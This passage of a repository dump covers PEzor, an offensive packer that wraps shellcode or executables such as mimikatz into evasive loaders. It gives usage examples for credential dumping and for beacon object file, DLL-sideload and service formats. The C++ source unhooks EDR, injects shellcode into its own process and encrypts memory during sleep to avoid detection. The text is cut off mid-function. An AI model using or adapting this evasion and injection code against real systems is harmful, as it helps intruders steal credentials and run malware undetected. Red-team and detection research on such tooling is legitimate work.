PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (beacon object file w/ cleanup)\n  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (dll)\n  $ PEzor.sh -format=dll mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (dll sideload)\n  $ PEzor.sh -format=dll -dll-sideload=version.dll mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (reflective dll)\n  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (service exe)\n  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (service dll)\n  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (dotnet)\n  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (dotnet-pinvoke)\n  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 64-bit (dotnet-createsection)\n  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\\users\\public\\mimi.out\" \"token::whoami\" \"exit\"'\n  # 32-bit (self-inject)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2\n  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread)\n  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2\n  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread) and arguments for donut\n  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 \"-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv\"\n```\n<!-- pezor-executablestop -->\n\n<!-- pezor-shellcode -->\n## `PEzor <SHELLCODE>`\n\nPack the provided shellcode into an executable\n\n```\nUSAGE\n  $ PEzor <-32|-64> [options...] <SHELLCODE>\n\nOPTIONS\n  -h                        Show usage and exits\n  -32                       Force 32-bit executable\n  -64                       Force 64-bit executable\n  -debug                    Generate a debug build\n  -unhook                   User-land hooks removal\n  -antidebug                Add anti-debug checks\n  -shellcode                Force shellcode detection\n  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]\n  -sgn                      Encode the provided shellcode with sgn\n  -text                     Store shellcode in .text section instead of .data\n  -rx                       Allocate RX memory for shellcode\n  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]\n  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)\n  -sleep=N                  Sleeps for N seconds before unpacking the shellcode\n  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)\n  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()\n  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)\n\nEXAMPLES\n  # 64-bit (self-inject RWX)\n  $ PEzor.sh shellcode.bin\n  # 64-bit (self-inject RX)\n  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 shellcode.bin\n  # 64-bit (self-inject)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin\n  # 64-bit (raw syscalls)\n  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin\n  # 64-bit (fluctuate to READWRITE when sleeping)\n  $ PEzor.sh -fluctuate=RW shellcode.bin\n  # 64-bit (fluctuate to NOACCESS when sleeping)\n  $ PEzor.sh -fluctuate=NA shellcode.bin\n  # 64-bit (use environmental keying with GetComputerNameExA)\n  $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME shellcode.bin\n  # 64-bit (beacon object file)\n  $ PEzor.sh -format=bof shellcode.bin\n  # 64-bit (beacon object file w/ cleanup)\n  $ PEzor.sh -format=bof -cleanup shellcode.bin\n  # 64-bit (dll)\n  $ PEzor.sh -format=dll shellcode.bin\n  # 64-bit (dll sideload)\n  $ PEzor.sh -format=dll -dll-sideload=version.dll shellcode.bin\n  # 64-bit (reflective dll)\n  $ PEzor.sh -format=reflective-dll shellcode.bin\n  # 64-bit (service exe)\n  $ PEzor.sh -format=service-exe shellcode.bin\n  # 64-bit (service dll)\n  $ PEzor.sh -format=service-dll shellcode.bin\n  # 64-bit (dotnet)\n  $ PEzor.sh -format=dotnet shellcode.bin\n  # 64-bit (dotnet-pinvoke)\n  $ PEzor.sh -format=dotnet-pinvoke shellcode.bin\n  # 64-bit (dotnet-createsection)\n  $ PEzor.sh -format=dotnet-createsection shellcode.bin\n  # 32-bit (self-inject)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin\n  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread)\n  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin\n```\n\n_See code: [PEzor.sh](https://github.com/phra/PEzor/blob/master/PEzor.sh)_\n<!-- pezor-shellcodestop -->\n"
        },
        {
          "name": "ReflectiveDLLInjection",
          "type": "tree",
          "content": null
        },
        {
          "name": "aggressor",
          "type": "tree",
          "content": null
        },
        {
          "name": "bof.cpp",
          "type": "blob",
          "size": 13.84765625,
          "content": "// x86_64-w64-mingw32-clang -c reflective-execution.c -D_BOF_ -o reflective-execution.o\n#define WIN32_LEAN_AND_MEAN\n\n#include <io.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <windows.h>\n#include <synchapi.h>\n#include <string.h>\n\n#define BUFFER_SIZE 1024\n#define _WAIT_TIMEOUT 5000\n#define ARRAY_MODULES_SIZE 128\n#define NT_FAIL(status) (status < 0)\n\n#pragma clang diagnostic ignored \"-Wnested-anon-types\"\n#pragma clang diagnostic ignored \"-Wgnu-anonymous-struct\"\n\n#include \"inject.hpp\"\n#include \"sleep.hpp\"\n\n#ifdef _BOF_\n\n#pragma clang diagnostic ignored \"-Wmacro-redefined\"\n#pragma clang diagnostic ignored \"-Wdollar-in-identifier-extension\"\n#pragma clang diagnostic ignored \"-Wwritable-strings\"\n\nextern \"C\" {\n#include \"beacon.h\"\n}\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$SetLastError(\n  DWORD dwErrCode\n);\n\n#define SetLastError KERNEL32$SetLastError\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreatePipe(\n    PHANDLE               hReadPipe,\n    PHANDLE               hWritePipe,\n    LPSECURITY_ATTRIBUTES lpPipeAttributes,\n    DWORD                 nSize\n);\n#define CreatePipe KERNEL32$CreatePipe\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetStdHandle(DWORD nStdHandle);\n#define GetStdHandle KERNEL32$GetStdHandle\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$SetStdHandle(\n    DWORD  nStdHandle,\n    HANDLE hHandle\n);\n#define SetStdHandle KERNEL32$SetStdHandle\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(\n    LPSECURITY_ATTRIBUTES   lpThreadAttributes,\n    SIZE_T                  dwStackSize,\n    LPTHREAD_START_ROUTINE  lpStartAddress,\n    __drv_aliasesMem LPVOID lpParameter,\n    DWORD                   dwCreationFlags,\n    LPDWORD                 lpThreadId\n);\n#define CreateThread KERNEL32$CreateThread\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI DWORD    WINAPI  KERNEL32$WaitForSingleObject(HANDLE, DWORD);\n#define WaitForSingleObject KERNEL32$WaitForSingleObject\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI LPVOID   WINAPI  KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);\n#define VirtualAlloc KERNEL32$VirtualAlloc\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);\n#define VirtualFree KERNEL32$VirtualFree\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);\n#define VirtualFreeEx KERNEL32$VirtualFreeEx\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);\n#define VirtualProtect KERNEL32$VirtualProtect\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$CloseHandle(HANDLE);\n#define CloseHandle KERNEL32$CloseHandle\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$AllocConsole(void);\n#define AllocConsole KERNEL32$AllocConsole\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$FreeConsole(void);\n#define FreeConsole KERNEL32$FreeConsole\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI HANDLE     WINAPI  KERNEL32$CreateFileA(\n  LPCSTR                lpFileName,\n  DWORD                 dwDesiredAccess,\n  DWORD                 dwShareMode,\n  LPSECURITY_ATTRIBUTES lpSecurityAttributes,\n  DWORD                 dwCreationDisposition,\n  DWORD                 dwFlagsAndAttributes,\n  HANDLE                hTemplateFile\n);\n#define CreateFileA KERNEL32$CreateFileA\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$ReadFile(HANDLE, PVOID, DWORD, PDWORD, LPOVERLAPPED);\n#define ReadFile KERNEL32$ReadFile\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$PeekNamedPipe(\n  HANDLE  hNamedPipe,\n  LPVOID  lpBuffer,\n  DWORD   nBufferSize,\n  LPDWORD lpBytesRead,\n  LPDWORD lpTotalBytesAvail,\n  LPDWORD lpBytesLeftThisMessage\n);\n#define PeekNamedPipe KERNEL32$PeekNamedPipe\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI PSAPI$EnumProcessModules(\n  HANDLE  hProcess,\n  HMODULE *lphModule,\n  DWORD   cb,\n  LPDWORD lpcbNeeded\n);\n#define EnumProcessModules PSAPI$EnumProcessModules\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_open_osfhandle(\n   intptr_t osfhandle,\n   int flags\n);\n#define _open_osfhandle MSVCRT$_open_osfhandle\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_dup2(int fd1, int fd2);\n#define _dup2 MSVCRT$_dup2\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_dup(int fd1);\n#define _dup MSVCRT$_dup\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_fileno(FILE *stream);\n#define _fileno MSVCRT$_fileno\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$setvbuf(\n   FILE *stream,\n   char *buffer,\n   int mode,\n   size_t size\n);\n#define setvbuf MSVCRT$setvbuf\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$puts(const char *str);\n#define puts MSVCRT$puts\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$perror(const char *str);\n#define perror MSVCRT$perror\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$printf(const char * format, ...);\n#define printf MSVCRT$printf\n\nextern \"C\" DECLSPEC_IMPORT int      __cdecl  MSVCRT$fprintf(FILE *stream, const char * format, ...);\n#define fprintf MSVCRT$fprintf\n\nextern \"C\" DECLSPEC_IMPORT errno_t      __cdecl  MSVCRT$freopen_s(\n   FILE ** stream,\n   const char * fileName,\n   const char * mode,\n   FILE* oldStream\n);\n#define freopen_s MSVCRT$freopen_s\n\nextern \"C\" DECLSPEC_IMPORT FILE*      __cdecl  MSVCRT$__iob_func();\n#define __iob_func MSVCRT$__iob_func\n\n// https://doxygen.reactos.org/d2/de9/acrt__iob__func_8c_source.html\nextern \"C\" __declspec(dllexport)\nFILE *__cdecl __acrt_iob_funcs(int index)\n{\n    return &(__iob_func()[index]);\n}\n\n#define stdin (__acrt_iob_funcs(0))\n#define stdout (__acrt_iob_funcs(1))\n#define stderr (__acrt_iob_funcs(2))\n\n#endif\n\nBOOL createPipe(HANDLE* pipeRead, HANDLE* pipeWrite) {\n    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};\n    return CreatePipe(pipeRead, pipeWrite, &sa, 0);\n}\n\nvoid redirectIO(FILE* hFrom, HANDLE hTo) {\n    int fd = _open_osfhandle((intptr_t)hTo, _O_TEXT);\n    _dup2(fd, _fileno(hFrom));\n    setvbuf(hFrom, NULL, _IONBF, 0); //Disable buffering.\n}\n\nvoid restoreIO(int stdoutFd, int stderrFd, HANDLE stdoutHandle, HANDLE stderrHandle) {\n    _dup2(stdoutFd, _fileno(stdout));\n    _dup2(stderrFd, _fileno(stderr));\n    SetStdHandle(STD_OUTPUT_HANDLE, stdoutHandle);\n    SetStdHandle(STD_ERROR_HANDLE, stderrHandle);\n}\n\nBOOL createConsole() {\n    if (!AllocConsole()) {\n        return FALSE;\n    }\n\n    FILE* fDummy;\n    freopen_s(&fDummy, \"CONOUT$\", \"w\", stdout);\n    freopen_s(&fDummy, \"CONOUT$\", \"w\", stderr);\n\n    HANDLE hConOut = CreateFileA(TEXT(\"CONOUT$\"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    SetStdHandle(STD_OUTPUT_HANDLE, hConOut);\n    SetStdHandle(STD_ERROR_HANDLE, hConOut);\n    return TRUE;\n}\n\n#ifdef _CLEANUP_\nBOOL isPresentInArray(HMODULE loadedModules[], HMODULE targetModule) {\n    for (unsigned int i = 0; i < ARRAY_MODULES_SIZE; i++) {\n        if (loadedModules[i] == targetModule) {\n            return TRUE;\n        }\n    }\n\n    return FALSE;\n}\n\nBOOL cleanupModules(HMODULE loadedModules[]) {\n    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];\n    DWORD cbNeeded = -1;\n    BOOL wasLibraryFreed = FALSE;\n\n    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));\n\n    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {\n        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {\n            #ifdef _BOF_\n            BeaconPrintf(CALLBACK_OUTPUT, \"[PEzor] Checking library %d\", i);\n            #endif\n            if (!isPresentInArray(loadedModules, hMods[i])) {\n                #ifdef _BOF_\n                BeaconPrintf(CALLBACK_OUTPUT, \"[PEzor] Freeing library %d\", i);\n                #endif\n                FreeLibrary(hMods[i]);\n                wasLibraryFreed = TRUE;\n            }\n        }\n    }\n\n    return wasLibraryFreed;\n}\n\nBOOL cleanupModules2(unsigned int numberOfLoadedModules) {\n    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];\n    DWORD cbNeeded = -1;\n    BOOL wasLibraryFreed = FALSE;\n\n    //numberOfLoadedModules -= 9; // numbers of modules loaded by the bof itself\n\n    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));\n\n    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {\n        for (unsigned int i = numberOfLoadedModules; i < (cbNeeded / sizeof(HMODULE)); i++) {\n            FreeLibrary(hMods[i]);\n            wasLibraryFreed = TRUE;\n        }\n    }\n\n    return wasLibraryFreed;\n}\n#endif\n\n#ifndef _BOF_\nDWORD WINAPI helloWorld(LPVOID lpParam) {\n    puts(\"Hello World!\\n\");\n    perror(\"Welp\\n\");\n    for (int i = 0; i < 1024; i++) {\n        printf(\"%d - \", i);\n    }\n\n    return 0;\n}\n#endif\n\nextern \"C\" __declspec(dllexport)\nint go(char * args, int alen) {\n    HANDLE stdoutHandle = INVALID_HANDLE_VALUE;\n    HANDLE stderrHandle = INVALID_HANDLE_VALUE;\n    HANDLE pipeReadOutput = INVALID_HANDLE_VALUE;\n    HANDLE pipeWriteOutput = INVALID_HANDLE_VALUE;\n    HANDLE pipeReadError = INVALID_HANDLE_VALUE;\n    HANDLE pipeWriteError = INVALID_HANDLE_VALUE;\n    int stdoutFd = -1;\n    int stderrFd = -1;\n    int readResult = -1;\n    DWORD waitResult = -1;\n    BOOL isThreadFinished = FALSE;\n    BOOL wasConsoleCreated = FALSE;\n    unsigned char recvBuffer[BUFFER_SIZE];\n    DWORD bytesRead = 0;\n    DWORD remainingDataOutput = 0;\n    DWORD remainingDataError = 0;\n    DWORD cbNeeded = -1;\n    HMODULE loadedModules[ARRAY_MODULES_SIZE * sizeof(HMODULE)];\n\n    #ifdef SYSCALLS\n    my_init_syscalls_list();\n    #endif\n\n    #ifdef _BOF_\n    BeaconPrintf(CALLBACK_OUTPUT, \"[PEzor] starting BOF...\");\n    #endif\n\n    __stosb((unsigned char*)loadedModules, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));\n    EnumProcessModules((HANDLE)-1, loadedModules, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded);\n\n    stdoutHandle = GetStdHandle(STD_OUTPUT_HANDLE);\n    stderrHandle = GetStdHandle(STD_ERROR_HANDLE);\n    stdoutFd = _dup(_fileno(stdout));\n    stderrFd = _dup(_fileno(stderr));\n    wasConsoleCreated = createConsole();\n    createPipe(&pipeReadOutput, &pipeWriteOutput);\n    createPipe(&pipeReadError, &pipeWriteError);\n    redirectIO(stdout, pipeWriteOutput);\n    redirectIO(stderr, pipeWriteError);\n\n    #ifndef _BOF_\n    DWORD dwThreadId = -1;\n    HANDLE hThread = CreateThread(\n        NULL,\n        0,\n        helloWorld,\n        NULL,\n        0,\n        &dwThreadId);\n    #else\n    HANDLE hThread = INVALID_HANDLE_VALUE;\n    LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);\n    if (!allocation || hThread == (HANDLE)-1) {\n        restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);\n        #ifdef _BOF_\n        BeaconPrintf(CALLBACK_ERROR, \"inject_shellcode_self: ERROR 0x%x\", allocation);\n        printf(\"inject_shellcode_self: ERROR 0x%x\", allocation);\n        #else\n        printf(\"inject_shellcode_self: ERROR 0x%x\", allocation);\n        #endif\n        return -1;\n    }\n    #endif\n\n    do {\n        waitResult = WaitForSingleObject(hThread, _WAIT_TIMEOUT);\n        switch (waitResult) {\n        case WAIT_ABANDONED:\n            restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);\n            perror(\"WAIT_ABANDONED\\n\");\n            break;\n        case WAIT_FAILED:\n            restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);\n            perror(\"WAIT_FAILED\\n\");\n            break;\n        case _WAIT_TIMEOUT:\n            break;\n        case WAIT_OBJECT_0:\n            isThreadFinished = TRUE;\n        }\n\n        PeekNamedPipe(pipeReadOutput, NULL, 0, NULL, &remainingDataOutput, NULL);\n        if (remainingDataOutput) {\n            SetLastError(0);\n            __stosb((unsigned char*)(void*)recvBuffer, 0, BUFFER_SIZE);\n            bytesRead = 0;\n            readResult = ReadFile(\n                pipeReadOutput,\n                recvBuffer,\n                BUFFER_SIZE - 1,\n                &bytesRead,\n                NULL);\n\n            if (!readResult) {\n                restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);\n                return -1;\n            }\n\n            recvBuffer[BUFFER_SIZE - 1] = '\\0';\n            #ifdef _BOF_\n            BeaconPrintf(CALLBACK_OUTPUT, \"%s\", recvBuffer);\n            #endif\n        }\n\n        PeekNamedPipe(pipeReadError, NULL, 0, NULL, &remainingDataError, NULL);\n        if (remainingDataError) {\n            SetLastError(0);\n            __stosb(recvBuffer, 0, BUFFER_SIZE);\n            bytesRead = 0;\n            readResult = ReadFile(\n                pipeReadError,\n                recvBuffer,\n                BUFFER_SIZE - 1,\n                &bytesRead,\n                NULL);\n\n            if (!readResult) {\n                restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);\n                return -1;\n            }\n\n            recvBuffer[BUFFER_SIZE - 1] = '\\0';\n            #ifdef _BOF_\n            BeaconPrintf(CALLBACK_ERROR, \"%s\", recvBuffer);\n            #endif\n        }\n    } while (!isThreadFinished || remainingDataOutput || remainingDataError);\n\n    restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);\n    if (wasConsoleCreated) {\n        CloseHandle(GetStdHandle(STD_OUTPUT_HANDLE));\n        CloseHandle(GetStdHandle(STD_ERROR_HANDLE));\n        FreeConsole();\n    }\n\n    CloseHandle(pipeWriteOutput);\n    CloseHandle(pipeReadOutput);\n    CloseHandle(pipeWriteError);\n    CloseHandle(pipeReadError);\n\n    #ifdef _CLEANUP_\n    //if (cleanupModules(loadedModules)) {\n    if (cleanupModules2(cbNeeded / sizeof(HMODULE))) {\n        // some module was freed\n        #ifdef _BOF_\n        BeaconPrintf(CALLBACK_OUTPUT, \"[PEzor] cleanup complete\");\n        #endif\n    } else {\n        #ifdef _BOF_\n        BeaconPrintf(CALLBACK_OUTPUT, \"[PEzor] no cleanup needed\");\n        #endif\n    }\n\n    if (VirtualFreeEx((HANDLE)-1, allocation, 0, MEM_RELEASE)) {\n        #ifdef _BOF_\n        BeaconPrintf(CALLBACK_OUTPUT, \"[PEzor] payload freed\");\n        #endif\n    } else {\n        #ifdef _BOF_\n        BeaconPrintf(CALLBACK_ERROR, \"[PEzor] error when freeing payload\");\n        #endif\n    }\n    #endif\n\n    return 0;\n}\n"
        },
        {
          "name": "docker.sh",
          "type": "blob",
          "size": 0.0986328125,
          "content": "#!/usr/bin/env bash\ndocker run -t -i --rm -v $PWD:/shared kalilinux/kali-rolling /shared/install.sh\n\n"
        },
        {
          "name": "dotnet",
          "type": "tree",
          "content": null
        },
        {
          "name": "examples",
          "type": "tree",
          "content": null
        },
        {
          "name": "fluctuate.cpp",
          "type": "blob",
          "size": 11.009765625,
          "content": "#include \"fluctuate.hpp\"\n\nunsigned char originalBytes[16] = { 0 };\nunsigned int originalProtection = 0;\nunsigned int XOR_KEY = 0;\n\n#ifdef _DEBUG_\n// https://gist.github.com/ccbrown/9722406\nvoid DumpHex(const void* data, size_t size) {\n\tchar ascii[17];\n\tsize_t i, j;\n\tascii[16] = '\\0';\n\tfor (i = 0; i < size; ++i) {\n\t\twprintf(L\"%02X \", ((unsigned char*)data)[i]);\n\t\tif (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {\n\t\t\tascii[i % 16] = ((unsigned char*)data)[i];\n\t\t} else {\n\t\t\tascii[i % 16] = '.';\n\t\t}\n\t\tif ((i+1) % 8 == 0 || i+1 == size) {\n\t\t\twprintf(L\" \");\n\t\t\tif ((i+1) % 16 == 0) {\n\t\t\t\twprintf(L\"|  %s \\n\", ascii);\n\t\t\t} else if (i+1 == size) {\n\t\t\t\tascii[(i+1) % 16] = '\\0';\n\t\t\t\tif ((i+1) % 16 <= 8) {\n\t\t\t\t\twprintf(L\" \");\n\t\t\t\t}\n\t\t\t\tfor (j = (i+1) % 16; j < 16; ++j) {\n\t\t\t\t\twprintf(L\"   \");\n\t\t\t\t}\n\t\t\t\twprintf(L\"|  %s \\n\", ascii);\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid print_protection(void* address, DWORD protections) {\n    if (protections & PAGE_READONLY)\n        wprintf(L\"print_protection: 0x%p is PAGE_READONLY\\n\", address);\n    if (protections & PAGE_READWRITE)\n        wprintf(L\"print_protection: 0x%p is PAGE_READWRITE\\n\", address);\n    if (protections & PAGE_NOACCESS)\n        wprintf(L\"print_protection: 0x%p is PAGE_NOACCESS\\n\", address);\n    if (protections & PAGE_WRITECOPY)\n        wprintf(L\"print_protection: 0x%p is PAGE_WRITECOPY\\n\", address);\n    if (protections & PAGE_EXECUTE)\n        wprintf(L\"print_protection: 0x%p is PAGE_EXECUTE\\n\", address);\n    if (protections & PAGE_EXECUTE_READ)\n        wprintf(L\"print_protection: 0x%p is PAGE_EXECUTE_READ\\n\", address);\n    if (protections & PAGE_EXECUTE_READWRITE)\n        wprintf(L\"print_protection: 0x%p is PAGE_EXECUTE_READWRITE\\n\", address);\n    if (protections & PAGE_EXECUTE_WRITECOPY)\n        wprintf(L\"print_protection: 0x%p is PAGE_EXECUTE_WRITECOPY\\n\", address);\n    if (protections & PAGE_GUARD)\n        wprintf(L\"print_protection: 0x%p is PAGE_GUARD\\n\", address);\n    if (protections & PAGE_NOCACHE)\n        wprintf(L\"print_protection: 0x%p is PAGE_NOCACHE\\n\", address);\n}\n\nvoid print_type(void* address, DWORD type) {\n    if (type & MEM_IMAGE)\n        wprintf(L\"print_type: 0x%p is MEM_IMAGE\\n\", address);\n    if (type & MEM_MAPPED)\n        wprintf(L\"print_type: 0x%p is MEM_MAPPED\\n\", address);\n    if (type & MEM_PRIVATE)\n        wprintf(L\"print_type: 0x%p is MEM_PRIVATE\\n\", address);\n}\n#endif\n\nunsigned int generate_random_int() {\n    std::srand(std::time(nullptr));\n    return std::rand() | std::rand() << 16;\n}\n\nvoid xor32(void* address, unsigned int size, unsigned int key) {\n    #ifdef _DEBUG_\n        wprintf(L\"xor32: before xor 0x%p:\\n\", address);\n        fflush(stdout);\n        DumpHex(address, 64);\n    #endif\n    for (struct { unsigned char* p; unsigned int i; } s = { (unsigned char*)address, 0 }; s.p < (unsigned char*)address + size; s.p++, s.i++) {\n        unsigned char currentKey = ((unsigned char*)&key)[s.i % 4];\n        *(s.p) ^= currentKey;\n    }\n\n    #ifdef _DEBUG_\n        wprintf(L\"xor32: after xor 0x%p:\\n\", address);\n        fflush(stdout);\n        DumpHex(address, 64);\n    #endif\n}\n\nBOOL is_shellcode_thread(void* address) {\n    MEMORY_BASIC_INFORMATION mbi = { 0 };\n    if (VirtualQuery(address, &mbi, sizeof(mbi))) {\n        #ifdef _DEBUG_\n            print_protection(address, mbi.Protect);\n            print_type(address, mbi.Type);\n        #endif\n        return mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED || mbi.Type == MEM_IMAGE;\n    } else {\n        #ifdef _DEBUG_\n            wprintf(L\"get_allocation_base_from_pointer: cannot get protection for 0x%p\\n\", address);\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n}\n\nvoid* get_allocation_base_from_pointer(void* address) {\n    MEMORY_BASIC_INFORMATION mbi = { 0 };\n    if (!VirtualQuery(address, &mbi, sizeof(mbi))) {\n        #ifdef _DEBUG_\n            wprintf(L\"get_allocation_base_from_pointer: cannot get allocation base for 0x%p\\n\", address);\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n\n    return mbi.AllocationBase;\n}\n\nSIZE_T get_region_size_from_pointer(void* address) {\n    MEMORY_BASIC_INFORMATION mbi = { 0 };\n    if (!VirtualQuery(address, &mbi, sizeof(mbi))) {\n        #ifdef _DEBUG_\n            wprintf(L\"get_region_size_from_pointer: cannot get region size for 0x%p\\n\", address);\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n    return (unsigned char*)mbi.BaseAddress - (unsigned char*)mbi.AllocationBase + mbi.RegionSize;\n}\n\nunsigned int get_protection_from_pointer(void* address) {\n    MEMORY_BASIC_INFORMATION mbi = { 0 };\n    if (!VirtualQuery(address, &mbi, sizeof(mbi))) {\n        #ifdef _DEBUG_\n            wprintf(L\"get_region_size_from_pointer: cannot get protection for 0x%p\\n\", address);\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n\n    return mbi.Protect;\n}\n\nvoid xor_region_and_change_protection(void* address, unsigned int key, DWORD newProtection) {\n    DWORD oldProt = 0;\n    void* allocation_base = get_allocation_base_from_pointer(address);\n    SIZE_T region_size = get_region_size_from_pointer(address);\n\n    #ifdef _DEBUG_\n        wprintf(L\"xor_region_and_change_protection: xoring 0x%p (base: 0x%p, length: %d) with key 0x%x (new protection: %d)\\n\", address, allocation_base, region_size, key, newProtection);\n        fflush(stdout);\n    #endif\n\n    if (!VirtualProtect(allocation_base, region_size, PAGE_READWRITE, &oldProt)) {\n        #ifdef _DEBUG_\n            wprintf(L\"xor_region_and_change_protection: cannot change protection (PAGE_READWRITE) for 0x%p, %d (last error: 0x%x)\\n\", allocation_base, region_size, GetLastError());\n            fflush(stdout);\n        #endif\n        if (!VirtualProtect(allocation_base, region_size, 